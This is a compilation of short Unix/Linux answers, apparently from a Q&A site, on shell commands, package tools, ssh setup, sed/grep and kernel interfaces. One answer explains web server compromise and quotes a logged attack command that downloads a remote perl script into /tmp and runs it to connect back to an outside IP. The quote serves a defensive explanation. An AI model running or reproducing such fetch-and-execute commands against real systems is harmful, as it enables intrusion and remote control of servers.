1 ) what handles /sys/class/gpio ? a kernel module ? a driver ? it is a kernel interface similar to the /proc directory . 2 ) is it possible to have more complicated module parameters in a kernel module , with some directory structure ? like a ' delays ' directory containing the params for delays yes ; some things in /proc and /sys do use directory hierarchies . if you want to modify or expand them , though , you have to modify the kernel . #3 has a similar answer -- to make changes you need to change the relevant kernel code . 4 ) how does the gpio thing creates new/deletes files in /sys/class/gpio when you write to [ un ] export ? these are not files on disk , they are just system interfaces . 1 when you go to read data from a procfs or sysfs file , what you are really doing is making a request for information from the kernel . the data is then formatted and returned . it probably is not stored anywhere in the form you see it , although parts of it may be stored in the kernel . when you write to such a file -- not all of them allow this -- you are sending a request to the kernel to do something specific . this can include , e.g. , activating or expanding the gpio interface . 1 . read and write calls are always system calls anyway , since normal files are normally on disk , and the kernel is needed to access hardware . hence using a filesystem style api here is natural ; even if they are not " real files " , accessing whatever resource they represent must involve system calls .
when they are running seems like you can just do this with kill and the output of jobs -p . example $ sleep 1000 &amp; [1] 21952 $ sleep 1000 &amp; [2] 21956 $ sleep 1000 &amp; [3] 21960  now i have 3 fake jobs running . $ jobs [1] Running sleep 1000 &amp; [2]- Running sleep 1000 &amp; [3]+ Running sleep 1000 &amp;  kill them all like so : $ kill $(jobs -p) [1] Terminated sleep 1000 [2]- Terminated sleep 1000 [3]+ Terminated sleep 1000  confirming they are all gone . $ jobs $  when they are stopped if you have jobs that are stopped , not running you do this instead . example $ kill $(jobs -p) $ jobs [1]+ Stopped sleep 1000 [2]- Stopped sleep 1000 [3] Stopped sleep 1000  ok so that did not kill them , but that is because the kill signal cannot be handled by the process itself , it is stopped . so tell the os to do the killing instead . that is what a -9 is for . $ kill -9 $(jobs -p) [1]+ Killed sleep 1000 [2]- Killed sleep 1000 [3] Killed sleep 1000  that is better . $ jobs $  when some are running and some are stopped if you have a mixed bag of processes where some are stopped and some are running you can do a kill first followed by a kill -9 . $ kill $(jobs -p); sleep &lt;time&gt;; \ kill -18 $(jobs -p); sleep &lt;time&gt;; kill -9 $(jobs -p)  extending the time slightly if you need more to allow for processes to stop themselves first . signals neither a hup ( -1 ) or a sigterm ( -15 ) to kill will succeed . but why ? that is because these signals are kinder in the sense that they are telling the application to terminate itself . but since the application is in a stopped state it can not process these signals . so you are only course is to use a sigkill ( -9 ) . you can see all the signals that kill provides with kill -l . if you want to learn even more about the various signals i highly encourage one to take a look at the signals man page , man 7 signal .
instead of using nohup , you could have your script ask these questions interactively and then background and disown the remainder of whatever else it has to do . example $ more a.bash #!/bin/bash read a echo "1st arg: $a" read b echo "2nd arg: $b" ( echo "I'm starting" sleep 10 echo "I'm done" ) &amp; disown  sample run : $ ./a.bash 10 1st arg: 10 20 2nd arg: 20 I'm starting $  check on it : 10 seconds later : $ I'm done 
there can not be multiple files named nohup.out in a single directory , so i assume you mean that you want to remove it recursively : find . -name nohup.out -exec rm {} +  if you are using gnu find , you can use -delete: find . -name nohup.out -delete  in bash4+ , you can also use globstar: shopt -s globstar dotglob rm -- **/nohup.out  note , however , that globstar traverses symlinks when descending the directory tree , and may break if the length of the file list exceeds the limit on the size of arguments .
for the new docroot to be accessible by apache , the apache users must be able to access all directories in the path leading up to /home/djc/www . so even though /home/djc/www is accessible to everyone , /home/djc must be executable by the apache user . so for example if you have : $ ls -ld ~ drwx------ 1 djc djc 0 Jan 13 15:16 /home/djc  you can make it accessible like this and it should be enough : $ chmod o+x ~ $ ls -ld ~ drwx-----x 1 djc djc 0 Jan 13 15:16 /home/djc 
you can press space then meta + . before pressing enter . this has the advantage that you can use it even with commands that make sense when applied to no argument . for source , use . to type less . if you are old-school , you can use !^ instead to recall the first argument from the previous command , or !$ to recall the last argument , or !* to recall all of them ( except the command name ) . you can get exactly the behavior you describe by writing functions that wrap around each command . the last argument from the previous command is available in the special parameter $_ .
what about dd ? you can use it to do a 1:1 copy of your sd card : dd if=/dev/&lt;your_old_sd_card&gt; of=/dev/&lt;your_new_sd_card&gt;  to copy your sd card to a new one , or : dd if=/dev/&lt;your_sd_card&gt; of=/a_file.img  to copy it to a file .
as far as the end result is concerned , they will do the same . the difference is in how dd would process data . and actually , both your examples are quite extreme in that regard : the bs parameter tells dd how much data it should buffer into the memory before outputting it . so , essentially , the first command would try to read 2gb in two chunks of 1gb , and the latter would try to read whole 2gb at one go and then output it to the aa file .
most likely not unless you can tell the kernel/init to use a splash image ; once grub loads the kernel its work is done and it relinquishes all control of the system to the kernel ( which in turns calls init when it is ready to proceed ) i admit i have never tried any of them , but splashy seems well supported . . . . also , 2.6.31 is " legacy " now ?
. tar . gz . asc - the files that end in .asc are ascii files that contain a gpg key which you can use to confirm the authenticity of the other files within that directory . only the author ( s ) of ffmpeg would be able to generate these keys using their private key to " sign " the other files there . note the key id above , D67658D8 . that is a hexidecimal string so it is typically written later on like this : 0xD67658D8 use this command to import ffmpeg 's gpg key from a key server : now verify the package : . git . tar . bz2 - these are often a snapshot build from the the project source code repository , where the developers commit ffmpeg as they work on it . often times these are automatically built , and so they may not be guaranteed to work . . tar . bz2 - these are the actual sources for the various versions of ffmpeg . if you are attempting to build a software package from source , these are likely the ones you want . if you do not need to install from source ( which can be a complex task the first couple of times ) , you might want to check if you can use [ macports ] versions of these tools , if they exist , instead .
if you need to find out what repo package ( s ) contain a specific file , you can try ( e . g . ) : yum provides "*/libdnet.so.1"  this uses shell globbing , so "*/" covers the fact that yum will be looking through absolute pathnames . that is necessary . note it searches your repositories , not just installed packages . for the example above using f17 , i get : this one is fairly straightforward , but since this is a filename search , you may often get lots of hits and have to make a considered guess about what it is you are really looking for . yum provides matches against a number of . rpm field headers , so you do not actually have to search for a specific file ( but shell glob syntax always applies ; the Provides: field often has stuff in it ) . e.g. , just plain yum provides libdnet works here -- as of course does the more common and straightforward : yum search libdnet 
no . there is no " fluxbox idesk desktop " . they are separate programs ( even projects ) . so , using nautilus is not a workaround , it is the way to achieve this .
it sounds like you downloaded the samba source , and that is not what you want right now . use yum install samba . that will find the correct rpm for your machine on a redhat ( or other trusted ) server , download it , and install it for you . if yum gives you a message about not having permissions , use sudo yum install samba . if that says sudo: command not found , type su to switch to the root user , then yum install sudo samba . remember to log out of root ( logout or ctrl-d ) as soon as you can ; you should not do more as root than you need to .
you need your ssh public key and you will need your ssh private key . keys can be generated with ssh_keygen . the private key must be kept on server 1 and the public key must be stored on server 2 . this is completly described in the manpage of openssh , so i will quote a lot of it . you should read the section ' authentication ' . also the openssh manual should be really helpful : http://www.openssh.org/manual.html please be careful with ssh because this affects the security of your server . from man ssh: this means you can store your private key in your home directory in . ssh . another possibility is to tell ssh via the -i parameter switch to use a special identity file . also from man ssh: this is for the private key . now you need to introduce your public key on server 2 . again a quote from man ssh: the easiest way to achive that is to copy the file to server 2 and append it to the authorized_keys file : scp -p your_pub_key.pub user@host: ssh user@host host$ cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys  authorisatzion via public key must be allowed for the ssh daemon , see man ssh_config . usually this can be done by adding the following statement to the config file : PubkeyAuthentication yes 
try using double quotes "": grep -oP "FW_6.0.0, SUCCESS" file  or ( because it is a fixed string , not a pattern ) : grep -oF "FW_6.0.0, SUCCESS" file  from grep man page :
the first command here emulates the formatting you see in vim . it intelligently expands tabs to the equivalent number of spaces , based on a tab-stop ( ts ) setting of every 4 columns . printf "ab\tcd\tde\\n" |expand -t4  output ab cd de  to keep the tabs as tabs and have the tab stop positions set to every 4th column , then you must change the way the environment works with a tab-char ( just as vim does with the :set ts=4 command ) for example , in the terminal , you can set the tab stop to 4 with this command ; tabs 4; printf "ab\tcd\tde\\n"  output ab cd de 
here are a couple additional options : apt-cache depends &lt;package_name&gt; will give you dependency info about a package ( installed or not ) including suggests . apt-rdepends -s Suggests &lt;package_name&gt; will list the suggests for a package and its dependencies . the apt-rdepends command is provided by its own package , apt -ly named apt-rdepends ( forgive the pun ) .
you can use eric hameleer 's build from http://www.slackware.com/~alien/slackbuilds/wine . might not be up to date ( i.e. . build for 14.0 might not be there ) , but you can try installing it anyway or just rebuild it yourself - on a reasonable machine it should be ready in tens of minutes top .
your grep prints all lines containing non-punctuation characters . that is not the same as printing all lines that do not contain punctuation characters . for the latter , you want the -v switch ( print lines that do not match the pattern ) : grep -v '[[:punct:]]' file.txt  if , for some reason you do not want to use the -v switch , you must make sure that the whole line consists of non-punctuation characters : grep '^[^[:punct:]]\+$' file.txt 
i do not know , why is your system read-only , try to search in dmesg | less . if you would like remount it to read-write , use mount -oremount,rw / command .
you can boot without initrd on any hardware . i never use it myself on desktops/laptops and home servers , because it just adds to boot time . the only situation where i have found it really necessary so far , is when your root filesystem is on an lvm ( but i may be in error - there might be some way to go about this also ) . if you want your setup to be fast and simple , you should first of all try to remove all the unnecessary stuff from your kernel configuration . there are two general ways you can do that while configuring your kernel : strip down - try to get rid of all the unnecessary modules and options or build up - take a minimal config and add in just the stuff you need i personally recommend the second option - simply because it takes less time and you avoid being overwhelmed by uncertainty about all the options . for a great starting point , you can pick an adequate pappy 's kernel seed . you can find more information about those on his webpage . with this approach , a general tip from my side is to first run lspci -knn , which will tell you , what modules are currently used by most of your hardware .
it appears that all of those were automatically installed as dependencies of the gnome metapackage . as you said , the gnome metapackage is incomplete without the gnome-games package , so it must be removed . that renders all the packages listed unused and so aptitude wants to remove them . there may be a way to remove gnome without removing its unused dependencies , but a quick search did not show one and i suspect that it would try to uninstall them every time you removed something else . your best bet is probably to figure out which of those packages you explicitly want and mark them manually installed , then let it uninstall the remainder if they are still unneeded .
starting with version 0.9.32 ( released 8 june 2011 ) , uclibc is supporting nptl for the following architectures : arm , i386 , mips , powerpc , sh , sh64 , x86_64 . actually , both are an implementation of pthreads and will provide libpthread . so .
okay well that took a while . but i got a solution . meanhile i even bought a new mouse . when you have a mouse with a high dpi you can use its standard dpi with minimum acceleration ( which is anyway going to be to fast ) follow these steps : get xinput $ sudo apt-get install xinput list your input devices xinput --list you should get an output like this : i my case my " hama urage " is hid 1d57:0005 . remember its id . now comes the magic . i would prefer to be able to increase the resolution but debian obv dont want me to . type in : xinput set-float-prop &lt;id&gt; 'Device Accel Constant Deceleration' &lt;d&gt;;  where is to be replaced by your mouse 's id and the deceleration factor . your have to play around a little bit . like me . at least x doeas not need a restart for applynig the changes . greets edit : to make it permanent edit x11 settings . sudo nano /etc/X11/xorg.conf add : option " constantdeceleration " "10" example : Section "InputClass" Identifier "My mouse" MatchIsPointer "true" Option "ConstantDeceleration" "10" EndSection  but if you often change your system an want to have some kind of portable config , add xinput to your . xinitrc . mine is xinput --set-prop "HID 1d57:0005" "Device Accel Constant Deceleration" 2 
no ! as a general rule , if you see a system file and you do not know what it is , do not remove it . even more generally , if an action requires root permissions and you do not know what it would mean , do not do it . the .sujournal file contains the soft updates journal . the file is not accessed directly as a file ; rather , it is space that is reserved for internal use by the filesystem driver . this space is marked as occupied in a file for compatibility with older versions of the filesystem driver : if you mount that filesystem with an ffs driver that supports journaled soft updates , then the driver uses that space to store the su journal ; if you mount that filesystem with an older ffs driver , the file is left untouched and the driver performs an fsck upon mounting instead of replaying the journal .
the sd card is not necessary visible as /dev/mmcblk* . another possibility is /dev/sd* . you can find name the either by looking into the dmesg output . other way is to eject card , type ls /dev , insert card , do ls /dev again and find the difference .
the error is generated by find , not rm . the reason is that you have written it so 'rm -i &lt;file&gt;' is the single argument . this shall be rewritten : find mysite mysite_BAK -name *.swp -exec rm -i '{}' \;  so find gets multiple arguments after "-exec " and treats the first one as command and others as the command arguments .
you can check whether the module you are trying to insert is present or not using $ modprobe -l | grep usbcore  generally all the modules are present in the path /lib/modules/&lt;kernel-version&gt;/kernel/ if present , you can then insert the module using modprobe or insmod command . $ insmod &lt;complete/path/to/module&gt;  edit : if modprobe -l option is not there , you can run the following find command to list all the modules : root@localhost# find /lib/modules/`uname -r` -name '*.ko' 
if you only need to map a few keys to values , just use an array
it does not seem to be possible in an easy way . from top 's perspective , any command a user runs using sudo would appear to be running as root because it really is running as root . one way you could try , is to track it down to the terminal where the user is logged in , then see processes running as root on that terminal . for example , $ w user USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT user pts/0 w.x.y.z 07:01 0.00s 1.07s 0.03s w user  note the user is on pts/0 . now run top . now press f ( field select ) , then g ( toggle controlling tty field ) , then enter . now watch for processes with pts/0 in the TTY column . you can also sort by TTY by pressing g a second time . or you could use procfs to get a list of pids , e.g. $ sudo grep -l SUDO_USER="\&lt;user\&gt;" /proc/*/environ  then do anything with that list . even use it to run top -p &lt;pid1&gt;,&lt;pid2&gt;... . sudo top -p $(sudo grep -l SUDO_USER='\&lt;user\&gt;' /proc/[0-9]*/environ | cut -f 3 -d / | tr '\\n' ',' | sed -e 's/,$//')  of course , in that case , top will not show you if that user starts a new command using sudo . also do not forget that a user running a command is probably being logged , e.g. to /var/log/secure or /var/log/auth.log , or /var/log/sudo.log , or whatever your system uses .
better format : ( sry 4 double answer ) go to settings> setting editor click on xfwm4 in ' chanel side bar click on general to display tree list and find one called ' mouesewheel_rollup ' click on to highlight and click edit icon at top of window its a bool so all you need to do is uncheck enable box . save from : http://forums.linuxmint.com/viewtopic.php?f=110t=101468
i gave up and coded my own tool . it allows for : -a all files -e existing files -n non-existing files  it only outputs the files so you do not need to deal with the output from strace . https://github.com/ole-tange/tangetools/tree/master/tracefile
try info coreutils 'who invocation': info documentation of gnu tools is usually far more complete than man pages .
server side : # nc -l -u -p 666 &gt; /tmp/666.txt  other server side 's shell : # tail -F /tmp/666.txt | while IFS= read -r line; do echo "$line"; # do what you want. done;  client side : # nc -uv 127.0.0.1 666 #### Print your commands. 
you can find out when a file was modified , and you can find out who owns it , but there is no guarantee that the owner is the one who modified it . write permission can be granted to other users , and there is usually no record of who modified a file . i said " usually " because there is an audit system that can keep that kind of record , but it is not activated in a typical installation . if you are willing to approximate " files recently modified by bob " using " files owned by bob and recently modified by someone " , then find somedir -type f -user bob -mtime -7 -print  would get you 7 days worth . maybe if you are only interested in files in bob 's home directory , you could omit the -user bob test .
sed is often used to pipe something through it , but it can process files just as well and , with the -i option , can even change them in place . sed -i 's|^\(permalink: http://blog\.\)olddomain\(\.com/.*\)$|\1newdomain\2|g' &lt;shell-glob-pattern&gt; 
in sed , you can put a regexp ( between /\u2026/ ) before the s command to only perform the replacement on lines containing that regexp . the -i option to modify files in place is specific to gnu sed ( which is what you have on linux and cygwin ) . sed -i -e '/^ *# *include/ s!\\\\!/!g' **/*.h **/*.cpp  in perl , just put a conditional before doing the replacement . perl -i -pe 'if (/^\s*#\s*include/) {s!\\\\!/!g}' **/*.h **/*.cpp perl -i -pe '/^\s*#\s*include/ and s!\\\\!/!g' **/*.h **/*.cpp  the **/ syntax to match files in the current directory and its subdirectories recursively requires zsh , or bash ≥4 after doing shopt -s globstar . with other shells , you need to use find . find \( -name '*.h' -o -name '*.cpp' \) -exec perl -i -pe '\u2026' {} + 
this actually makes a rather strong argument for " learn one editor well " . fwiw , the . vimrc statement would be " set nobackup " .
it might be a side effect of sound chip powersaving ( switching on and off ) . i experienced something similar when i misconfigured tlp ( a power management tool ) , which switched the hda-intel chip off every couple of seconds i am not sure where to configure similar options without tlp . might depend on which powermanagement tools are in use .
notes added on july 8 , 2014: as riccardo murri pointed out , my answer below only shows whether the processor reports to support hyperthreading . generally , *nix o/s are configured to enable hyperthreading if supported . however , to actually check this programmatically see for instance nils ' answer ! ---- original answer from march 25 , 2012: you are indeed on the right track : ) with dmidecode -t processor | grep HTT  on linux , i generally just look for " ht " on the " flags " line of /proc/cpuinfo . see for instance grep '^flags\b' /proc/cpuinfo | tail -1  or if you want to include the " ht " in the pattern grep -o '^flags\b.*: .*\bht\b' /proc/cpuinfo | tail -1  ( \b matches the word boundaries and helps avoid false positives in cases where " ht " is part of another flag . )
if your openssl library is dynamically linked to the squid executable then it will use the current openssl library . it has no choice as the older one will have been removed during the system upgrade . on the other hand , if squid was statically linked at compile time to the openssl library , it will be using the old one . run:- ldd &lt;path to squid executable&gt;  and see if the openssl library is listed . if it is , then it is dynamically linked and you are ok .
exploits by their very nature are trying to not be detected . so most exploits are not coming into the system through normal means , at least not initially . they will typically use something like a buffer overflow to gain access to the system . buffer overflow this style of attack looks for portions of an application that are looking to take input from a user . think about a web page and the various text boxes where you have to provide information by typing things into these text boxes . each of these text boxes is a potential entry point for a would-be attacker . the good news : most of these attacks are not gaining root access , they are gaining access to a user account specifically setup for the web server , so it typically has limited access to only web server files and functions . in breaking in the attacker has left a considerable trail in a number of areas . the firewall logs webserver logs other potential security tool logs the bad news : they have gained access to a system , and so have a beachhead where they can continue trying to break in further . the logs . yes most of the time break-ins are not detected for weeks/months/years given that analyzing logs is both time consuming and error prone . detecting root logins most systems are designed to not allow root logins so this attack vector is not really an issue . most attacks gain access to some other lower level account and then leverage up by finding additional vulnerabilities once they have established a beachhead on your system . example #1: a would be attacker could gain root access by doing the following : break into a system 's web server account by finding a vulnerable web page that processes a user 's input from some form through text boxes . once access to the web server account has been achieved , attempt to either gain shell access through the web server 's account or attempt to get the web server account to run commands on your behalf . determine that there is a weakness in this particular system 's version of a tool such as the command ls . overflow the tool ls to gain access to the root account . example #2: a would be attacker might not even be interested in gaining full control of your system . most break-ins are only interested in collecting systems to be used as " slaves " for other uses . so often the attacker is only interested in getting their software installed on your system so that they can use the system , without ever even gaining full control of the system . determine that a certain web site has made available webapp x . attacker knows that webapp x has a vulnerability where webapp x allows users to upload image files . attacker prepares a file called CMD.gif and uploads it . maybe it is a user 's avatar image on a forum site , for example . but CMD.gif is not a image , it is actually a program , who is named CMD.gif . attacker uploads " image " to the forum site . now attacker " tricks " webapp x into running his " image " . attacker makes calls with his browser to webapp x , but he calls it in ways the authors of webapp x never imagined . nor did they design webapp x to disallow it . web server log file of such an attack note : sample log from an apache web server courtesy ossec .net. here the attacker is getting webapp x ( index . php ) to run CMD.gif which can then do the following : cd /tmp wget http://72.36.254.26/~fanta/dc.txt perl dc.txt 72.36.21.183 21 so they have coaxed webapp x into changing directories to /tmp , download a file , dc.txt , and then run the file making a connection back to ip address 72.36.21.183 on port 21 . disabling a " compromised " server the idea that you can shut a server down that has " detected " an exploit is a good attempt , but it does not work for a couple of reasons . if the attacker can get into the first system , then they can probably get into the second system . most systems are essentially clones of each other . they are easier to maintain , and keeping things simple ( the same ) is a hallmark of most things in it and computers . different configurations means more work in maintaining the systems and more opportunities to make mistakes , which is usually what leads to a vulnerability to begin with . the attackers goal might not be to break in , they might be trying to deny access to your service . this is called a denial of service ( dos ) . attempting to limit damage i could go on and on but in general you have a few resources available when it comes to securing a system . use tools such as tripwire to detect changes on a system 's file system . firewalls - limit access so that it is only explicitly allowed where needed , rather then having full access to everything . analyze log files using tools to detect anomalies . keep systems current and up to date with patches . limit exposure - only install software that is needed on a system - if it does not need the gcc compiler installed , do not install it . ids - intrusion detection software .
there are two things involved with doing this : how to get the email to the system process the email to append info to a file the first you can solve by having the mail be sent to the server directly , but if the server is not online all the time ( located at home ) , it is probably better to have the emails sent to some google or yahoo account and fetch them from there . you can do that with fetchmail , and have the mail delivered locally to a user list . for the second part you can use procmail , with specific rules for the user in ~/.procmailrc . the local mail delivery agent needs to be told to use procmail e.g. in postfix you add : mailbox_command = procmail -a "$EXTENSION"  to your /etc/postfix/main.cf file . in the file ~list/.procmailrc you can specify rules on what to do with mail ( all mails arriving there , or the ones with specific characteristics ( subject , from address , etc ) ) . procmail has several useful build in actions , and if those do not suffice you can pipe the mail into a program to do something specific it cannot do .
it says you have to run # cd /usr/ports/x11/xorg # make install clean  and in the preface , it says examples starting with # indicate a command that must be invoked as the superuser in freebsd . you can login as root to type the command , or login as your normal account and use su ( 1 ) to gain superuser privileges . # dd if=kern . flp of=/dev/fd0
1 . are we sure it is not a typo ? are you sure that worked under 4.8 ? i just tried it in 4.3.2 . $ rpm --version RPM version 4.3.2 $ rpm -H -H: unknown option  2 . switch is confirmed ! this seems to be limited to just version 4.8 only . $ rpm -H $ $ cat /etc/redhat-release CentOS release 6.5 (Final)  3 . evidence of its existence i did find this thread on rpm5 . org , titled : re : parsing hdlists with rpmgi ? which shows the -H switch in action . and here : 4 . smoking gun . . . git commit logs ! this would appear to be the smoking gun . this shows a discussion in removing this feature . it is the git commit log . in that same thread is this code snippet which shows the switch being removed . - { "hdlist", 'H', POPT_ARGFLAG_DOC_HIDDEN, 0, POPT_HDLIST, - N_("query/verify package(s) from system HDLIST"), "HDLIST" }, -  so the switch is synonymous with --hdlist . references 5.3 generating a new hdlist file
go for debian testing : life : official support for debian releases end a year after a new one has been released . so if you go for debian stable , you only have a year from next release before needing to upgrade . stability : at the time of writing , the soon-to-be debian 6 " squeeze " had ~20 rc bugs while then debian 5 " lenny " had a whooping ~900 rc bugs ( but do not read too much into it ) . packages : each release of debian has more packages than the last . note that sometimes some packages are removed from a release . reasons may include death of software , stability , security , . . . kernels : more often than not , you want a newer kernel , if not for nothing but improved hardware support .
i believe it depends on how fast you ping the server : if it is one ping per second ( or even slightly faster ) , they will most likely not care . if it is much faster , they may consider it a ddos attack by ping flood . it is especially the case if you do not wait for the previous answer before sending the next ping . it reminds me of the kids who brought yahoo ! , amazon and some others down to their knees a few years back by flooding them with pings . since then , yes , ping is considered a potential weapon . also , be careful about what part of the network you want to sample . you never know who answers to google . com queries . more accurately , you never where the answer comes from . chances are it comes from not very far from you ( you are being geo-localized ) but you can not know for sure . i would target a smaller organization where you can first identify the location of the server .
&amp; is the whole match , so just use &amp;_something in the substitute operation .
i found this via su . here 's the basic example , though i am still customizing it for myself : i would explain it except i do not really understand it yet
you need to create a ( possible empty ) file called __init__.py in your bb_files folder . from the docs : the __init__ . py files are required to make python treat the directories as containing packages ; this is done to prevent directories with a common name , such as string , from unintentionally hiding valid modules that occur later on the module search path . in the simplest case , __init__ . py can just be an empty file , but it can also execute initialization code for the package
running SSH on an alternate port does not count as security anymore . it only adds a slight bit of obscurity , and an added step of complexity for your users . it adds zero obstacles for people looking to break your network , who are using automated port scanners and do not care what port it is running on . if you want to bolster security on a system that is allowing remote internet-based inbound ssh , control your users in the sshd_config as @anthon indicated , and then also implement security directly in pam . create two groups , lusers and rusers . add the remote mobile users to the rusers group . use the pam_succeed_if . so pam module to permit access to those users . add lines to your pam config for ssh : account sufficient pam_succeed_if.so user ingroup lusers account sufficient pam_succeed_if.so user ingroup rusers  *some pam_succeed_if . so modules may require you to use slightly different syntax , like group = lusers . * then , not only is sshd limiting the users that can connect , but in the event of a bug in sshd , you still have the protection that the pam based restrictions offer . one additional step for the remote users is to force the use of ssh_keys with passphrases . so , local users can login with keys or passwords , but remote users must have a key , and if you create the keys for them , you can make sure the key has a passphrase associates . thus limiting access to locations that actually possess the ssh key and the passphrase . and limiting potential attack vectors if a user 's password is compomised . in sshd_config : change 2 settings : ChallengeResponseAuthentication yes  and PasswordAuthentication yes  to : ChallengeResponseAuthentication no  and PasswordAuthentication no  so , the default is to now allow only key authentication . then for local users you can user the match config setting to change the default for local users . assuming your local private network is 192.168.1.0/24 , add to sshd_config: Match Address 192.168.1.0/24 PasswordAuthentication yes  now , the local users can connect with passwords or keys , and remote users will be forced to use keys . it is up to you to create the keys with pass-phrases . as an added benefit , you only have to manage a single sshd_config , and you only have to run ssh on a single port , which eases your own management .
you can create a new rule to /etc/udev/rules.d/ . first read the file /etc/udev/rules.d/README . in the new rule file , add something like KERNEL=="sd?1",ACTION=="mount",RUN+="/path/to/script.sh"  ( i did not try the above line , try your own rules . ) note that the script will be run as root . you might want to use su to change that . using ACTION=="add" would require script.sh first to mount the volume .
you can try installing grub at /dev/sda for manually loading kernel , you can try following : set root (hd0,1) linux /vmlinuz root=/dev/sda1 initrd /initrd.img  here please note that you need to put your kernel version . for example , my kernel version is 3.0.0-12 ( initrd . img-3.0.0-12-generic and vmlinuz-3.0.0-12-generic ) . to load this kernel , you have to try following : set root (hd0,1) linux /vmlinuz-3.0.0-12-generic root=/dev/sda1 initrd /initrd.img-3.0.0-12-generic  you will find your available versions by pressing after typing linux or initrd command . another thing is , make sure your root resides on /dev/sda1 best luck : )
from the arch wiki : to list all packages no longer required as dependencies ( orphans ) : $ pacman -Qdt or , to recursively remove orphans : orphans() { if [[ ! -n $(pacman -Qdt) ]]; then echo "No orphans to remove." else sudo pacman -Rs $(pacman -Qdtq) fi }
dmesg prints the contents of the ring buffer . this information is also sent in real time to syslogd or klogd , when they are running , and ends up in /var/log/messages ; when dmesg is most useful is in capturing boot-time messages from before syslogd and/or klogd started , so that they will be properly logged .
probably you do not load the ssl module . you should have a loadmodule directive somewhere in your apache configuration files . something like : LoadModule ssl_module /usr/lib64/apache2-prefork/mod_ssl.so  usually apache configuration template has ( on any distribution ) a file called ( something like ) loadmodule.conf in which you should find a LoadModule directive for each module you load into apache at server start .
this should work nicely even for complicated arguments with whitespace and worse : #!/bin/bash new_args=() for arg do new_args+=( '-p' ) new_args+=( "$arg" ) done for arg in "${new_args[@]}" do echo "$arg" done  test : $ ~/test.sh foo $'bar\\n\tbaz bay' -p foo -p bar baz bay 
midnight is 0 0 * * * /usr/bin/php /www/sites/[domain.com]/files/html/shell/indexer.php reindexall  your current crontab runs every full hour . for more info see e.g. this
-ne only means " not equal " when it is in an if [ \u2026 ] statement . in this case -ne is an option to echo . you could just as easily use -en . from bash(1): if -n is specified , the trailing newline is suppressed . if the -e option is given , interpretation of the following backslash-escaped characters is enabled . in this example there is no comparison . just echo .
this is the expression you are looking for : sed -e 's/^.*"name":"\([^"]*\)".*$/\1/' infile  it results to : CastingBy-v12 mixed.mov  in yours there are several errors : in sed only greeding expression can be used : .*? and .+? are incorrect . the + must be escaped . use [^"]* to avoid that the regular expression matches until last double quotes of the string .
it is not deleting them because it recognises the filenames as arguments ( unquoted , in this situation * expands to -f -i ize ) . to delete these files , either do rm -- * , or rm ./* . -- signifies the end of arguments , ./ uses the link to the current directory to circumvent rm 's argument detection . generally ./* is preferable , as some programs do not accept -- to stop checking for arguments . this is not a bug . this is something that should be handled by calling rm in the correct fashion to avoid such issues .
i usually need to make use of the resize and reset commands to sometimes clear/fix problems when resizing the actual xterm window . to use resize: $ eval `resize`  if you run resize by itself , it'll report what the columns and lines will be set to . to use reset: $ reset  references reset man page resize man page
a2ps was the answer . i installed it with brew : brew install a2ps now i can a2ps myfilename and it works . unfortunately it comes out landscape and if i try to make it portrait it is squished over to the left and tiny , only up taking 50% of the page . [ upate - found fix to this with parameter -1 ( for number of pages to find on one sheet - the default was 2 ) however as landscaped it worked and the code has the fixed format style i was looking for .
to just kill all background jobs managed by bash , do kill $(jobs -p)  note that since both jobs and kill are built into bash , you should not run into any errors of the argument list too long type .
this situation comes from a misunderstanding of what ssmtp is doing . there is a very important difference between the message envelope ( which mail servers use for routing mail ) and the message body ( which is displayed in your e-mail client ) . both may have To and From , and they may be different from each other . this is okay ! ssmtp merely creates the envelope and facilitates transferring the message to the mta . it expects the body you pass it to fully formed and contain all body headers . it will not add any for you* , ( although it will insert message handling headers , e.g. , Received-by , et al . ) . i am sure you have also noticed that there is also no Subject: with those messages . so the answer to your question is that the To: field needs to be included in message.txt . to make the To: and Subject: fields show up you need to format message.txt like this : To: cwd@gmail.com Subject: Message for you Message text starts here. blah blah blah.  *that is not exactly true . since a From: header is the only required header one will be derived from the envelope and inserted if it is missing .
sed can do that : sed -i.bak '/STRING/d' web/* 
i am not sure if it is what is happening in your case , but pressing ctrl + s will freeze the tty , causing no updates to happen , though your commands are still going through . to unfreeze the tty , you need to hit ctrl + q . again , i am not totally sure this is what is happening in your case , but i do this by accident often enough , that it is possible it may affect others as well .
you do not mention what distribution you are using ( please include that information in your question ) , but i have seen similar behavior after running updates on my systems . my best guess is when you ran a system update , or if it ran automatically , the " bash-completion " package was updated which added this behavior . in red hat derivatives , you can find package documentation in /usr/share/doc/PACKAGENAME . in my /usr/share/doc/bash-completion-1.3/CHANGES , new changes are listed via a change log format . instead of modifying /etc/bash_completion , which could potentially get overwritten at the next package upgrade , you can create ~/.inputrc to disable tilde expansion . i confirmed bash_completion-1.3.6 will honor this on my fedora 16 box . set expand-tilde off  edit your mileage may vary with ~/.inputrc . bash has functions that may override that behavior depending on what you try to complete ( e . g . a program vs a file or directory ) . this discussion on super user se addresses a similar question when autocompleting a vim command . in this case , the original poster solved his issue by adding a custom function to his ~/.bashrc .
autocd was introduced into bash with version 4 . so , a general cross-platform solution should be : [ "${BASH_VERSINFO[0]}" -ge 4 ] &amp;&amp; shopt -s autocd  ${BASH_VERSINFO[0]} is bash 's major version . the minor version , should you ever need it , is ${BASH_VERSINFO[1]} . see man bash for more on BASH_VERSINFO .
ideally those would be sftp accounts , using ssh public key authentication rather than passwords . you had gain both security and convenience . but let 's assume you do not have a choice of not using ftp with passwords . you could store the passwords ( the .netrc file ) on an encrypted filesystem and mount that filesystem only when you want to access it . a simple way to create an encrypted directory tree is encfs . setup : daily use : encfs ~/.passwords.encfs ~/.passwords.d ftp \u2026 fusermount -u ~/.passwords.d 
in shell scripting , everything is a string . you do need to quote the * to prevent filename expansion , but you do not want to put the backslash escape sequence inside double quotes . you could just concatenate the strings by placing them right after each other . find . -name '*'$'\\n''*'  but for better readability , you can use ansi-c quoting for the whole string . find . -name $'*\\n*' 
you can search oldest files and then you can check if total number of files are more then n files then delete oldest files first in a script or you can also simply use the following example . let 's say you do not want to delete last 3 latest files : ls -t1 | tail -n +4 | xargs rm -rf
